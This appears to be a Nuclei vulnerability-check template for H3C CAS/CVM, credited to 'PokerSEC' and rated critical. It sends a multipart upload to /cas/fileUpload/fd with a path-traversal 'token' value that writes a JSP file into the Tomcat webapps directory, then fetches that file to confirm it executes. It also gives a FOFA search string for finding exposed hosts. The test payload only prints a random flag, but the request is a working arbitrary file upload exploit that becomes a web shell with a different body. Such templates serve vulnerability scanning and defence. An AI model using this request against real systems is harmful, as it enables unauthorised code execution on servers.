http:
- matchers:
  - condition: and
    dsl:
    - status_code_1==200 && status_code_2==200 && contains_all(body_2,"{{flag}}")
    type: dsl
  matchers-condition: and
  raw:
  - "POST /cas/fileUpload/fd HTTP/1.1\nHost: \nAccept-Encoding: gzip, deflate\nAccept:\
    \ */*\nConnection: close\nContent-Type: multipart/form-data; boundary=WebKitFormBoundaryMMqEBbEFHlzOcYq4\n\
    \n--WebKitFormBoundaryMMqEBbEFHlzOcYq4\nContent-Disposition: form-data; name=\"\
    token\"\n\n/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp\n\
    --WebKitFormBoundaryMMqEBbEFHlzOcYq4\nContent-Disposition: form-data; name=\"\
    file\"; filename=\"{{filename}}.jsp\"\nContent-Type: image/png\n\n<% out.println(\"\
    {{flag}}\");%>  \n--WebKitFormBoundaryMMqEBbEFHlzOcYq4--"
  - 'GET /cas/js/lib/buttons/{{filename}}.jsp HTTP/1.1

    Host: {{Hostname}}


    '
id: h3c-CAS-CVM-fd-uploadfile
info:
  author: PokerSEC
  metadata:
    fofasearch: body="css/img/loginpage.png"
  name: h3c-CAS-CVM-fd-uploadfile
  severity: critical
variables:
  filename: '{{to_lower(rand_base(10))}}'
  flag: '{{to_lower(rand_base(10))}}'
